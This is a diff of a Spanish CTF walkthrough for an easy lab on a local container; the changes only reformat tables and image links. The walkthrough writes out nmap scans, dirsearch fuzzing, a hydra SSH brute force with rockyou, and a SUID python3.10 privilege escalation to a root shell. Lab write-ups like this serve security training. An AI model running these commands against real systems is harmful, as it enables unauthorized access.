@@ -1,10 +1,10 @@
 ## Información General
 
-| Campo | Valor |
+|Campo|Valor|
 |---|---|
-| **Plataforma** | whoami-labs |
-| **Dificultad** | Fácil |
-| **Autor** | elc0ket |
+|**Plataforma**|whoami-labs|
+|**Dificultad**|Fácil|
+|**Autor**|elc0ket|
 
 ## Técnicas Usadas
 
@@ -16,17 +16,17 @@ Enumeración de servicios, Fuzzing web, Fuerza bruta SSH, Escalada de privilegio
 
 ### Escaneo de Puertos con Nmap
 
-```bash
+```
 nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 172.17.0.2
 ```
 
-![](images/IMG-20260627163221404.png)
+![[IMG-20260627163221404.png]]
 
 ```bash
 nmap -p 21,22,25,3306,5432,6379,8080,8081 -sC -sV -oN allports 172.17.0.2
 ```
 
-![](images/IMG-20260627163253899.png)
+![[IMG-20260627163253899.png]]
 
 ### Enumeración Web (Puerto 8080)
 
@@ -36,7 +36,7 @@ http://172.17.0.2:8080
 
 La página muestra un artículo sobre escalada de privilegios con permisos SUID. El código fuente no revela información relevante.
 
-![](images/IMG-20260627163337643.png)
+![[IMG-20260627163337643.png]]
 
 Procedemos a realizar fuzzing con `dirsearch`:
 
@@ -44,12 +44,12 @@ Procedemos a realizar fuzzing con `dirsearch`:
 dirsearch -u http://172.17.0.2:8080/ --exclude-status 403,404,500 -e php,txt,html
 ```
 
-![](images/IMG-20260627163412700.png)
+![[IMG-20260627163412700.png]]
 
 > [!warning] Hallazgo
 > Se obtiene el nombre de usuario SSH: `hacker`
 
-![](images/IMG-20260627163439594.png)
+![[IMG-20260627163439594.png]]
 
 ---
 
@@ -61,7 +61,7 @@ dirsearch -u http://172.17.0.2:8080/ --exclude-status 403,404,500 -e php,txt,htm
 hydra -l hacker -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -f
 ```
 
-![](images/IMG-20260627163518444.png)
+![[IMG-20260627163518444.png]]
 
 **Credenciales encontradas:**
 - **Usuario:** `hacker`
@@ -74,7 +74,7 @@ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
 ssh hacker@172.17.0.2
 ```
 
-![](images/IMG-20260627163556261.png)
+![[IMG-20260627163556261.png]]
 
 ---
 
@@ -88,7 +88,7 @@ find / -perm -4000 -type f 2>/dev/null
 
 Binarios destacados con SUID:
 
-![](images/IMG-20260627163636581.png)
+![[IMG-20260627163636581.png]]
 
 ### Explotación con `python3.10`
 
@@ -96,7 +96,7 @@ Binarios destacados con SUID:
 /usr/bin/python3.10 -c 'import os;os.execl("/bin/bash","bash","-p")'
 ```
 
-![](images/IMG-20260627163743124.png)
+![[IMG-20260627163743124.png]]
 
 ### Captura de Flag
 
@@ -104,7 +104,7 @@ Binarios destacados con SUID:
 cd /root
 ```
 
-![](images/IMG-20260627163813063.png)
+![[IMG-20260627163813063.png]]
 
 ---
 
